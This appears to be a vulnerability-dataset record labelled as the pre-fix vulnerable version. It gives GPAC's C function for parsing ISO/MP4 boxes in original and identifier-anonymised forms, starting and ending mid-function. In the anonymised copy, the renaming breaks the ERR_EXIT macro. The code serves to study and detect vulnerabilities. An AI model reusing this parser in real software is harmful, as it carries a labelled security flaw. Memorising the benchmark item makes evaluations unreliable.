GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box type %s (0x%08X) at position ""LLU"" has size 0 but is not at root/file level. Forbidden, skipping end of parent box !\n"", gf_4cc_to_str(type), type, start));
return GF_SKIP_BOX;
}
return GF_OK;
}
}
if (is_root_box && (size>=8)) {
Bool do_uncompress = GF_FALSE;
u8 *compb = NULL;
u32 osize = 0;
u32 otype = type;
if (type==GF_4CC('!', 'm', 'o', 'f')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_MOOF;
}
else if (type==GF_4CC('!', 'm', 'o', 'v')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_MOOV;
}
else if (type==GF_4CC('!', 's', 'i', 'x')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_SIDX;
}
else if (type==GF_4CC('!', 's', 's', 'x')) {
do_uncompress = GF_TRUE;
type = GF_ISOM_BOX_TYPE_SSIX;
}
if (do_uncompress) {
compb = gf_malloc((u32) (size-8));
if (!compb) return GF_OUT_OF_MEM;
compressed_size = (u32) (size - 8);
gf_bs_read_data(bs, compb, compressed_size);
e = gf_gz_decompress_payload(compb, compressed_size, &uncomp_data, &osize);
if (e) {
gf_free(compb);
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(otype), otype));
return e;
}
size = osize + 8;
uncomp_bs = gf_bs_new(uncomp_data, osize, GF_BITSTREAM_READ);
bs = uncomp_bs;
start = 0;
gf_free(compb);
}
}
}
#define ERR_EXIT(_e) { \
if (uncomp_bs) {\
gf_free(uncomp_data);\
gf_bs_del(uncomp_bs); \
}\
return _e;\
}
memset(uuid, 0, 16);
if (type == GF_ISOM_BOX_TYPE_UUID ) {
if (gf_bs_available(bs) < 16) {
ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
}
gf_bs_read_data(bs, uuid, 16);
hdr_size += 16;
uuid_type = gf_isom_solve_uuid_box(uuid);
}
if (size == 1) {
if (gf_bs_available(bs) < 8) {
ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
}
size = gf_bs_read_u64(bs);
hdr_size += 8;
}
if (!skip_logs)
GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Read Box type %s size ""LLD"" start ""LLD""\n"", gf_4cc_to_str(type), size,  start));
if ( size < hdr_size ) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Box %s size ""LLD"" less than box header size %d\n"", gf_4cc_to_str(type), size, hdr_size));
ERR_EXIT(GF_ISOM_INVALID_FILE);
}
if (parent_size && (parent_size<size)) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Box %s size ""LLU"" is larger than remaining parent size ""LLU""\n"", gf_4cc_to_str(type), size, parent_size ));
ERR_EXIT(GF_ISOM_INVALID_FILE);
}
restore_type = 0;
if ((parent_type==GF_ISOM_BOX_TYPE_STSD) && (type==GF_QT_SUBTYPE_RAW) ) {
u64 cookie = gf_bs_get_cookie(bs);
restore_type = type;
if (cookie & GF_ISOM_BS_COOKIE_VISUAL_TRACK)
type = GF_QT_SUBTYPE_RAW_VID;
else
type = GF_QT_SUBTYPE_RAW_AUD;
}
if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TREF)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFT);
if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
((GF_TrackReferenceTypeBox*)newBox)->reference_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_IREF)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFI);
if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
((GF_ItemReferenceTypeBox*)newBox)->reference_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TRGR)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_TRGT);
if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
((GF_TrackGroupTypeBox*)newBox)->group_type = type;
} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_GRPL)) {
newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_GRPT);
if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
((GF_EntityToGroupTypeBox*)newBox)->grouping_type = type;
} else {
is_special = GF_FALSE;
newBox = gf_isom_box_new_ex(uuid_type ? uuid_type : type, parent_type, skip_logs, is_root_box);
if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
}
if (type==GF_ISOM_BOX_TYPE_UUID && !is_special) {
memcpy(((GF_UUIDBox *)newBox)->uuid, uuid, 16);
((GF_UUIDBox *)newBox)->internal_4cc = uuid_type;
}
if (!newBox->type) newBox->type = type;
if (restore_type)
newBox->type = restore_type;
end = gf_bs_available(bs);
if (size - hdr_size > end ) {
newBox->size = size - hdr_size - end;
*outBox = newBox;
ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
}
newBox->size = size - hdr_size;
e = gf_isom_full_box_read(newBox, bs);
if (!e) e = gf_isom_box_read(newBox, bs);
if (e) {
if (gf_opts_get_bool(""core"", ""no-check""))
e = GF_OK;
}
newBox->size = size;
end = gf_bs_get_position(bs);
if (uncomp_bs) {
gf_free(uncomp_data);
gf_bs_del(uncomp_bs);
if (e) {
gf_isom_box_del(newBox);
*outBox = NULL;
return e;
}
size -= 8;
if (type==GF_ISOM_BOX_TYPE_MOOF) {
((GF_MovieFragmentBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
else if (type==GF_ISOM_BOX_TYPE_MOOV) {
((GF_MovieBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
((GF_MovieBox *)newBox)->file_offset = comp_start;
}
else if (type==GF_ISOM_BOX_TYPE_SIDX) {
((GF_SegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
else if (type==GF_ISOM_BOX_TYPE_SSIX) {
((GF_SubsegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
}
newBox->internal_flags = GF_ISOM_BOX_COMPRESSED;
}
if (e && (e != GF_ISOM_INCOMPLETE_FILE)) {
gf_isom_box_del(newBox);
*outBox = NULL;
if (is_root_box && (e==GF_SKIP_BOX))
e = GF_ISOM_INVALID_FILE;
if (!skip_logs && (e!=GF_SKIP_BOX)) {
GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box \""%s\"" (start ""LLU"") failed (%s) - skipping\n"", gf_4cc_to_str(type), start, gf_error_to_string(e)));
}
return e;
}
if (end-start > size) {
if (!skip_logs) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" size ""LLU"" (start ""LLU"") invalid (read ""LLU"")\n"", gf_4cc_to_str(type), size, start, (end-start) ));
}
gf_bs_seek(bs, start+size);
} else if (end-start < size) {
u32 to_skip = (u32) (size-(end-start));
if (!skip_logs) {
if ((to_skip!=4) || gf_bs_peek_bits(bs, 32, 0)) {
GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" (start ""LLU"") has %u extra bytes\n"", gf_4cc_to_str(type), start, to_skip));
unused_bytes += to_skip;
}
}
gf_bs_skip_bytes(bs, to_skip);
}
*outBox = newBox;
return e;
}","GF_Err gf_isom_box_parse_ex(GF_Box **VAR_0, GF_BitStream *VAR_1, u32 VAR_2, Bool VAR_3, u64 VAR_4)
{
u32 VAR_5, VAR_6, VAR_7, VAR_8;
u64 VAR_9, VAR_10, VAR_11, VAR_12;
char VAR_13[16];
GF_Err VAR_14;
GF_BitStream *VAR_15 = NULL;
u8 *VAR_16 = NULL;
u32 VAR_17=0;
GF_Box *VAR_18;
Bool VAR_19 = (gf_bs_get_cookie(VAR_1) & VAR_20 ) ? VAR_21 : VAR_22;
Bool VAR_23 = VAR_21;
if ((VAR_1 == NULL) || (VAR_0 == NULL) ) return VAR_24;
*VAR_0 = NULL;
if (gf_bs_available(VAR_1) < 8) {
return VAR_25;
}
VAR_11 = VAR_10 = gf_bs_get_position(VAR_1);
VAR_6 = 0;
VAR_9 = (u64) gf_bs_read_u32(VAR_1);
VAR_7 = 4;
if ((VAR_9 >= 2) && (VAR_9 <= 4)) {
VAR_9 = 4;
VAR_5 = VAR_26;
} else {
VAR_5 = gf_bs_read_u32(VAR_1);
VAR_7 += 4;
if (VAR_5 == VAR_27)
VAR_9 = 12;
if (!VAR_9) {
if (VAR_3) {
if (!VAR_19) {
GF_LOG(VAR_28, VAR_29, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(VAR_5), VAR_5));
}
VAR_9 = gf_bs_available(VAR_1) + 8;
} else {
if (!VAR_19) {
GF_LOG(VAR_30, VAR_29, (""[iso file] Read Box type %s (0x%08X) at position ""VAR_31"" has size 0 but is not at root/file level. Forbidden, skipping end of parent box !\n"", gf_4cc_to_str(VAR_5), VAR_5, VAR_10));
return VAR_32;
}
return VAR_33;
}
}
if (VAR_3 && (VAR_9>=8)) {
Bool VAR_34 = VAR_22;
u8 *VAR_35 = NULL;
u32 VAR_36 = 0;
u32 VAR_37 = VAR_5;
if (VAR_5==GF_4CC('!', 'm', 'o', 'f')) {
VAR_34 = VAR_21;
VAR_5 = VAR_38;
}
else if (VAR_5==GF_4CC('!', 'm', 'o', 'v')) {
VAR_34 = VAR_21;
VAR_5 = VAR_39;
}
else if (VAR_5==GF_4CC('!', 's', 'i', 'x')) {
VAR_34 = VAR_21;
VAR_5 = VAR_40;
}
else if (VAR_5==GF_4CC('!', 's', 's', 'x')) {
VAR_34 = VAR_21;
VAR_5 = VAR_41;
}
if (VAR_34) {
VAR_35 = gf_malloc((u32) (VAR_9-8));
if (!VAR_35) return VAR_42;
VAR_17 = (u32) (VAR_9 - 8);
gf_bs_read_data(VAR_1, VAR_35, VAR_17);
VAR_14 = gf_gz_decompress_payload(VAR_35, VAR_17, &VAR_16, &VAR_36);
if (VAR_14) {
gf_free(VAR_35);
GF_LOG(VAR_30, VAR_29, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(VAR_37), VAR_37));
return VAR_14;
}
VAR_9 = VAR_36 + 8;
VAR_15 = gf_bs_new(VAR_16, VAR_36, VAR_43);
VAR_1 = VAR_15;
VAR_10 = 0;
gf_free(VAR_35);
}
}
}
#define ERR_EXIT(VAR_44) { \
if (uncomp_bs) {\
gf_free(uncomp_data);\
gf_bs_del(uncomp_bs); \
}\
return _e;\
}
memset(VAR_13, 0, 16);
if (VAR_5 == VAR_45 ) {
if (gf_bs_available(VAR_1) < 16) {
ERR_EXIT(VAR_25);
}
gf_bs_read_data(VAR_1, VAR_13, 16);
VAR_7 += 16;
VAR_6 = gf_isom_solve_uuid_box(VAR_13);
}
if (VAR_9 == 1) {
if (gf_bs_available(VAR_1) < 8) {
ERR_EXIT(VAR_25);
}
VAR_9 = gf_bs_read_u64(VAR_1);
VAR_7 += 8;
}
if (!VAR_19)
GF_LOG(VAR_28, VAR_29, (""[iso file] Read Box type %s size ""VAR_46"" start ""VAR_46""\n"", gf_4cc_to_str(VAR_5), VAR_9,  VAR_10));
if ( VAR_9 < VAR_7 ) {
GF_LOG(VAR_30, VAR_29, (""[iso file] Box %s size ""VAR_46"" less than box header size %d\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_7));
ERR_EXIT(VAR_47);
}
if (VAR_4 && (VAR_4<VAR_9)) {
GF_LOG(VAR_30, VAR_29, (""[iso file] Box %s size ""VAR_31"" is larger than remaining parent size ""VAR_31""\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_4 ));
ERR_EXIT(VAR_47);
}
VAR_8 = 0;
if ((VAR_2==VAR_48) && (VAR_5==VAR_49) ) {
u64 VAR_50 = gf_bs_get_cookie(VAR_1);
VAR_8 = VAR_5;
if (VAR_50 & VAR_51)
VAR_5 = VAR_52;
else
VAR_5 = VAR_53;
}
if (VAR_2 && (VAR_2 == VAR_54)) {
VAR_18 = gf_isom_box_new(VAR_55);
if (!VAR_18) ERR_EXIT(VAR_42);
((GF_TrackReferenceTypeBox*)VAR_18)->reference_type = VAR_5;
} else if (VAR_2 && (VAR_2 == VAR_56)) {
VAR_18 = gf_isom_box_new(VAR_57);
if (!VAR_18) ERR_EXIT(VAR_42);
((GF_ItemReferenceTypeBox*)VAR_18)->reference_type = VAR_5;
} else if (VAR_2 && (VAR_2 == VAR_58)) {
VAR_18 = gf_isom_box_new(VAR_59);
if (!VAR_18) ERR_EXIT(VAR_42);
((GF_TrackGroupTypeBox*)VAR_18)->group_type = VAR_5;
} else if (VAR_2 && (VAR_2 == VAR_60)) {
VAR_18 = gf_isom_box_new(VAR_61);
if (!VAR_18) ERR_EXIT(VAR_42);
((GF_EntityToGroupTypeBox*)VAR_18)->grouping_type = VAR_5;
} else {
VAR_23 = VAR_22;
VAR_18 = gf_isom_box_new_ex(VAR_6 ? VAR_6 : VAR_5, VAR_2, VAR_19, VAR_3);
if (!VAR_18) ERR_EXIT(VAR_42);
}
if (VAR_5==VAR_45 && !VAR_23) {
memcpy(((GF_UUIDBox *)VAR_18)->uuid, VAR_13, 16);
((GF_UUIDBox *)VAR_18)->internal_4cc = VAR_6;
}
if (!VAR_18->type) VAR_18->type = VAR_5;
if (VAR_8)
VAR_18->type = VAR_8;
VAR_12 = gf_bs_available(VAR_1);
if (VAR_9 - VAR_7 > VAR_12 ) {
VAR_18->size = VAR_9 - VAR_7 - VAR_12;
*VAR_0 = VAR_18;
ERR_EXIT(VAR_25);
}
VAR_18->size = VAR_9 - VAR_7;
VAR_14 = gf_isom_full_box_read(VAR_18, VAR_1);
if (!VAR_14) VAR_14 = gf_isom_box_read(VAR_18, VAR_1);
if (VAR_14) {
if (gf_opts_get_bool(""core"", ""no-check""))
VAR_14 = VAR_33;
}
VAR_18->size = VAR_9;
VAR_12 = gf_bs_get_position(VAR_1);
if (VAR_15) {
gf_free(VAR_16);
gf_bs_del(VAR_15);
if (VAR_14) {
gf_isom_box_del(VAR_18);
*VAR_0 = NULL;
return VAR_14;
}
VAR_9 -= 8;
if (VAR_5==VAR_38) {
((GF_MovieFragmentBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
}
else if (VAR_5==VAR_39) {
((GF_MovieBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
((GF_MovieBox *)VAR_18)->file_offset = VAR_11;
}
else if (VAR_5==VAR_40) {
((GF_SegmentIndexBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
}
else if (VAR_5==VAR_41) {
((GF_SubsegmentIndexBox *)VAR_18)->compressed_diff = (s32)VAR_9 - (s32)VAR_17;
}
VAR_18->internal_flags = VAR_62;
}
if (VAR_14 && (VAR_14 != VAR_25)) {
gf_isom_box_del(VAR_18);
*VAR_0 = NULL;
if (VAR_3 && (VAR_14==VAR_32))
VAR_14 = VAR_47;
if (!VAR_19 && (VAR_14!=VAR_32)) {
GF_LOG(VAR_30, VAR_29, (""[iso file] Read Box \""%s\"" (start ""VAR_31"") failed (%s) - skipping\n"", gf_4cc_to_str(VAR_5), VAR_10, gf_error_to_string(VAR_14)));
}
return VAR_14;
}
if (VAR_12-VAR_10 > VAR_9) {
if (!VAR_19) {
GF_LOG(VAR_63, VAR_29, (""[iso file] Box \""%s\"" size ""VAR_31"" (start ""VAR_31"") invalid (read ""VAR_31"")\n"", gf_4cc_to_str(VAR_5), VAR_9, VAR_10, (VAR_12-VAR_10) ));
}
gf_bs_seek(VAR_1, VAR_10+VAR_9);
} else if (VAR_12-VAR_10 < VAR_9) {
u32 VAR_64 = (u32) (VAR_9-(VAR_12-VAR_10));
if (!VAR_19) {
if ((VAR_64!=4) || gf_bs_peek_bits(VAR_1, 32, 0)) {
GF_LOG(VAR_63, VAR_29, (""[iso file] Box \""%s\"" (start ""VAR_31"") has %u extra bytes\n"", gf_4cc_to_str(VAR_5), VAR_10, VAR_64));
VAR_65 += VAR_64;
}
}
gf_bs_skip_bytes(VAR_1, VAR_64);
}
*VAR_0 = VAR_18;
return VAR_14;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_funcs.c/vul/before/1.json,"GF_Err gf_isom_box_parse_ex(GF_Box **outBox, GF_BitStream *bs, u32 parent_type, Bool is_root_box, u64 parent_size)
{
	u32 type, uuid_type, hdr_size, restore_type;
	u64 size, start, comp_start, end;
	char uuid[16];
	GF_Err e;
	GF_BitStream *uncomp_bs = NULL;
	u8 *uncomp_data = NULL;
	u32 compressed_size=0;
	GF_Box *newBox;
	Bool skip_logs = (gf_bs_get_cookie(bs) & GF_ISOM_BS_COOKIE_NO_LOGS ) ? GF_TRUE : GF_FALSE;
	Bool is_special = GF_TRUE;

	if ((bs == NULL) || (outBox == NULL) ) return GF_BAD_PARAM;
	*outBox = NULL;
	if (gf_bs_available(bs) < 8) {
		return GF_ISOM_INCOMPLETE_FILE;
	}

	comp_start = start = gf_bs_get_position(bs);

	uuid_type = 0;
	size = (u64) gf_bs_read_u32(bs);
	hdr_size = 4;
	/*fix for some boxes found in some old hinted files*/
	if ((size >= 2) && (size <= 4)) {
		size = 4;
		type = GF_ISOM_BOX_TYPE_VOID;
	} else {
		type = gf_bs_read_u32(bs);
		hdr_size += 4;
		/*no size means till end of file - EXCEPT FOR some old QuickTime boxes...*/
		if (type == GF_ISOM_BOX_TYPE_TOTL)
			size = 12;
		if (!size) {
			if (is_root_box) {
				if (!skip_logs) {
					GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(type), type));
				}
				size = gf_bs_available(bs) + 8;
			} else {
				if (!skip_logs) {
					GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box type %s (0x%08X) at position ""LLU"" has size 0 but is not at root/file level. Forbidden, skipping end of parent box !\n"", gf_4cc_to_str(type), type, start));
					return GF_SKIP_BOX;
				}
				return GF_OK;
			}
		}
		if (is_root_box && (size>=8)) {
			Bool do_uncompress = GF_FALSE;
			u8 *compb = NULL;
			u32 osize = 0;
			u32 otype = type;
			if (type==GF_4CC('!', 'm', 'o', 'f')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_MOOF;
			}
			else if (type==GF_4CC('!', 'm', 'o', 'v')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_MOOV;
			}
			else if (type==GF_4CC('!', 's', 'i', 'x')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_SIDX;
			}
			else if (type==GF_4CC('!', 's', 's', 'x')) {
				do_uncompress = GF_TRUE;
				type = GF_ISOM_BOX_TYPE_SSIX;
			}

			if (do_uncompress) {
				compb = gf_malloc((u32) (size-8));
				if (!compb) return GF_OUT_OF_MEM;

				compressed_size = (u32) (size - 8);
				gf_bs_read_data(bs, compb, compressed_size);
				e = gf_gz_decompress_payload(compb, compressed_size, &uncomp_data, &osize);
				if (e) {
					gf_free(compb);
					GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(otype), otype));
					return e;
				}

				//keep size as complete box size for tests below
				size = osize + 8;
				uncomp_bs = gf_bs_new(uncomp_data, osize, GF_BITSTREAM_READ);
				bs = uncomp_bs;
				start = 0;
				gf_free(compb);
			}
		}
	}

#define ERR_EXIT(_e) { \
		if (uncomp_bs) {\
			gf_free(uncomp_data);\
			gf_bs_del(uncomp_bs); \
		}\
		return _e;\
	}

	/*handle uuid*/
	memset(uuid, 0, 16);
	if (type == GF_ISOM_BOX_TYPE_UUID ) {
		if (gf_bs_available(bs) < 16) {
			ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
		}
		gf_bs_read_data(bs, uuid, 16);
		hdr_size += 16;
		uuid_type = gf_isom_solve_uuid_box(uuid);
	}

	//handle large box
	if (size == 1) {
		if (gf_bs_available(bs) < 8) {
			ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
		}
		size = gf_bs_read_u64(bs);
		hdr_size += 8;
	}
	if (!skip_logs)
		GF_LOG(GF_LOG_DEBUG, GF_LOG_CONTAINER, (""[iso file] Read Box type %s size ""LLD"" start ""LLD""\n"", gf_4cc_to_str(type), size,  start));

	if ( size < hdr_size ) {
		GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Box %s size ""LLD"" less than box header size %d\n"", gf_4cc_to_str(type), size, hdr_size));
		ERR_EXIT(GF_ISOM_INVALID_FILE);
	}
	//if parent size is given, make sure box fits within parent
	if (parent_size && (parent_size<size)) {
		GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Box %s size ""LLU"" is larger than remaining parent size ""LLU""\n"", gf_4cc_to_str(type), size, parent_size ));
		ERR_EXIT(GF_ISOM_INVALID_FILE);
	}
	restore_type = 0;
	if ((parent_type==GF_ISOM_BOX_TYPE_STSD) && (type==GF_QT_SUBTYPE_RAW) ) {
		u64 cookie = gf_bs_get_cookie(bs);
		restore_type = type;
		if (cookie & GF_ISOM_BS_COOKIE_VISUAL_TRACK)
			type = GF_QT_SUBTYPE_RAW_VID;
		else
			type = GF_QT_SUBTYPE_RAW_AUD;

	}

	//some special boxes (references and track groups) are handled by a single generic box with an associated ref/group type
	if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TREF)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFT);
		if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
		((GF_TrackReferenceTypeBox*)newBox)->reference_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_IREF)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_REFI);
		if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
		((GF_ItemReferenceTypeBox*)newBox)->reference_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_TRGR)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_TRGT);
		if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
		((GF_TrackGroupTypeBox*)newBox)->group_type = type;
	} else if (parent_type && (parent_type == GF_ISOM_BOX_TYPE_GRPL)) {
		newBox = gf_isom_box_new(GF_ISOM_BOX_TYPE_GRPT);
		if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
		((GF_EntityToGroupTypeBox*)newBox)->grouping_type = type;
	} else {
		//OK, create the box based on the type
		is_special = GF_FALSE;
		newBox = gf_isom_box_new_ex(uuid_type ? uuid_type : type, parent_type, skip_logs, is_root_box);
		if (!newBox) ERR_EXIT(GF_OUT_OF_MEM);
	}

	//OK, init and read this box
	if (type==GF_ISOM_BOX_TYPE_UUID && !is_special) {
		memcpy(((GF_UUIDBox *)newBox)->uuid, uuid, 16);
		((GF_UUIDBox *)newBox)->internal_4cc = uuid_type;
	}

	if (!newBox->type) newBox->type = type;
	if (restore_type)
		newBox->type = restore_type;

	end = gf_bs_available(bs);
	if (size - hdr_size > end ) {
		newBox->size = size - hdr_size - end;
		*outBox = newBox;
		ERR_EXIT(GF_ISOM_INCOMPLETE_FILE);
	}

	newBox->size = size - hdr_size;

	e = gf_isom_full_box_read(newBox, bs);
	if (!e) e = gf_isom_box_read(newBox, bs);
	if (e) {
		if (gf_opts_get_bool(""core"", ""no-check""))
			e = GF_OK;
	}
	newBox->size = size;
	end = gf_bs_get_position(bs);

	if (uncomp_bs) {
		gf_free(uncomp_data);
		gf_bs_del(uncomp_bs);
		if (e) {
			gf_isom_box_del(newBox);
			*outBox = NULL;
			return e;
		}
		//move size to real bitstream offsets for tests below
		size -= 8;
		//remember compressed vs real size info for moof in order to properly recompute data_offset/base_data_offset
		if (type==GF_ISOM_BOX_TYPE_MOOF) {
			((GF_MovieFragmentBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		//remember compressed vs real size info for moov in order to properly recompute chunk offset
		else if (type==GF_ISOM_BOX_TYPE_MOOV) {
			((GF_MovieBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
			((GF_MovieBox *)newBox)->file_offset = comp_start;
		}
		//remember compressed vs real size info for dump
		else if (type==GF_ISOM_BOX_TYPE_SIDX) {
			((GF_SegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		//remember compressed vs real size info for dump
		else if (type==GF_ISOM_BOX_TYPE_SSIX) {
			((GF_SubsegmentIndexBox *)newBox)->compressed_diff = (s32)size - (s32)compressed_size;
		}
		newBox->internal_flags = GF_ISOM_BOX_COMPRESSED;
	}


	if (e && (e != GF_ISOM_INCOMPLETE_FILE)) {
		gf_isom_box_del(newBox);
		*outBox = NULL;
		if (is_root_box && (e==GF_SKIP_BOX))
			e = GF_ISOM_INVALID_FILE;

		if (!skip_logs && (e!=GF_SKIP_BOX)) {
			GF_LOG(GF_LOG_ERROR, GF_LOG_CONTAINER, (""[iso file] Read Box \""%s\"" (start ""LLU"") failed (%s) - skipping\n"", gf_4cc_to_str(type), start, gf_error_to_string(e)));
		}
		//we don't try to reparse known boxes that have been failing (too dangerous)
		return e;
	}

	if (end-start > size) {
		if (!skip_logs) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" size ""LLU"" (start ""LLU"") invalid (read ""LLU"")\n"", gf_4cc_to_str(type), size, start, (end-start) ));
		}
		/*let's still try to load the file since no error was notified*/
		gf_bs_seek(bs, start+size);
	} else if (end-start < size) {
		u32 to_skip = (u32) (size-(end-start));
		if (!skip_logs) {
			if ((to_skip!=4) || gf_bs_peek_bits(bs, 32, 0)) {
				GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] Box \""%s\"" (start ""LLU"") has %u extra bytes\n"", gf_4cc_to_str(type), start, to_skip));
				unused_bytes += to_skip;
			}
		}
		gf_bs_skip_bytes(bs, to_skip);
	}
	*outBox = newBox;

	return e;
}","GF_Err gf_isom_box_parse_ex(GF_Box **VAR_0, GF_BitStream *VAR_1, u32 VAR_2, Bool VAR_3, u64 VAR_4)
{
	u32 VAR_5, VAR_6, VAR_7, VAR_8;
	u64 VAR_9, VAR_10, VAR_11, VAR_12;
	char VAR_13[16];
	GF_Err VAR_14;
	GF_BitStream *VAR_15 = NULL;
	u8 *VAR_16 = NULL;
	u32 VAR_17=0;
	GF_Box *VAR_18;
	Bool VAR_19 = (gf_bs_get_cookie(VAR_1) & VAR_20 ) ? VAR_21 : VAR_22;
	Bool VAR_23 = VAR_21;

	if ((VAR_1 == NULL) || (VAR_0 == NULL) ) return VAR_24;
	*VAR_0 = NULL;
	if (gf_bs_available(VAR_1) < 8) {
		return VAR_25;
	}

	VAR_11 = VAR_10 = gf_bs_get_position(VAR_1);

	VAR_6 = 0;
	VAR_9 = (u64) gf_bs_read_u32(VAR_1);
	VAR_7 = 4;
	/* COMMENT_0 */
	if ((VAR_9 >= 2) && (VAR_9 <= 4)) {
		VAR_9 = 4;
		VAR_5 = VAR_26;
	} else {
		VAR_5 = gf_bs_read_u32(VAR_1);
		VAR_7 += 4;
		/* COMMENT_1 */
		if (VAR_5 == VAR_27)
			VAR_9 = 12;
		if (!VAR_9) {
			if (VAR_3) {
				if (!VAR_19) {
					GF_LOG(VAR_28, VAR_29, (""[iso file] Warning Read Box type %s (0x%08X) size 0 reading till the end of file\n"", gf_4cc_to_str(VAR_5), VAR_5));
				}
				VAR_9 = gf_bs_available(VAR_1) + 8;
			} else {
				if (!VAR_19) {
					GF_LOG(VAR_30, VAR_29, (""[iso file] Read Box type %s (0x%08X) at position ""VAR_31"" has size 0 but is not at root/file level. Forbidden, skipping end of parent box !\n"", gf_4cc_to_str(VAR_5), VAR_5, VAR_10));
					return VAR_32;
				}
				return VAR_33;
			}
		}
		if (VAR_3 && (VAR_9>=8)) {
			Bool VAR_34 = VAR_22;
			u8 *VAR_35 = NULL;
			u32 VAR_36 = 0;
			u32 VAR_37 = VAR_5;
			if (VAR_5==GF_4CC('!', 'm', 'o', 'f')) {
				VAR_34 = VAR_21;
				VAR_5 = VAR_38;
			}
			else if (VAR_5==GF_4CC('!', 'm', 'o', 'v')) {
				VAR_34 = VAR_21;
				VAR_5 = VAR_39;
			}
			else if (VAR_5==GF_4CC('!', 's', 'i', 'x')) {
				VAR_34 = VAR_21;
				VAR_5 = VAR_40;
			}
			else if (VAR_5==GF_4CC('!', 's', 's', 'x')) {
				VAR_34 = VAR_21;
				VAR_5 = VAR_41;
			}

			if (VAR_34) {
				VAR_35 = gf_malloc((u32) (VAR_9-8));
				if (!VAR_35) return VAR_42;

				VAR_17 = (u32) (VAR_9 - 8);
				gf_bs_read_data(VAR_1, VAR_35, VAR_17);
				VAR_14 = gf_gz_decompress_payload(VAR_35, VAR_17, &VAR_16, &VAR_36);
				if (VAR_14) {
					gf_free(VAR_35);
					GF_LOG(VAR_30, VAR_29, (""[iso file] Failed to uncompress payload for box type %s (0x%08X)\n"", gf_4cc_to_str(VAR_37), VAR_37));
					return VAR_14;
				}

				/* COMMENT_2 */
				VAR_9 = VAR_36 + 8;
				VAR_15 = gf_bs_new(VAR_16, VAR_36, VAR_43);
				VAR_1 = VAR_15;
				VAR_10 = 0;
				gf_free(VAR_35);
			}
		}
	}

#define ERR_EXIT(VAR_44) { \
		if (uncomp_bs) {\
			gf_free(uncomp_data);\
			gf_bs_del(uncomp_bs); \
		}\
		return _e;\
	}

	/* COMMENT_3 */
	memset(VAR_13, 0, 16);
